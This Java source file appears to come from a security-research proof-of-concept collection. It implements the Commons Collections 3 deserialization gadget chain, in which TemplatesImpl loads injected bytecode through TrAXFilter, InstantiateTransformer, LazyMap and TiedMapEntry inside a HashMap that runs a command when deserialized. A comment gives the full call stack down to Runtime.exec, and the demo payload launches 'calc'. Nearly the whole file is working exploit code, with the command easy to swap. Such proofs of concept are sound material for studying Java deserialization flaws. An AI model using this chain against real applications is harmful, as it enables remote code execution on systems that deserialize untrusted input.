package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * transform:106, InstantiateTransformer (org.apache.commons.collections.functors)
 * transform:123, ChainedTransformer (org.apache.commons.collections.functors)
 * get:158, LazyMap (org.apache.commons.collections.map)
 * getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
 * hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
 * hash:338, HashMap (java.util)
 * readObject:1397, HashMap (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:59, SerializeUtils (com.javasec.utils)
 * main:52, CommonsCollections3 (com.javasec.pocs.cc)
 */
public class CommonsCollections3 {
    public static void main(String[] args) throws Exception {
        Templates templatesImpl = SerializeUtils.getTemplate("calc");
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //CC1后半
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1)); //随便改成什么Transformer
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap, "aaa");
        HashMap<Object, Object> hashMap=new HashMap<>();
        hashMap.put(tiedMapEntry,"bbb");
        map.remove("aaa");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);
        String s = SerializeUtils.base64serial(hashMap);
        SerializeUtils.base64deserial(s);
    }
}
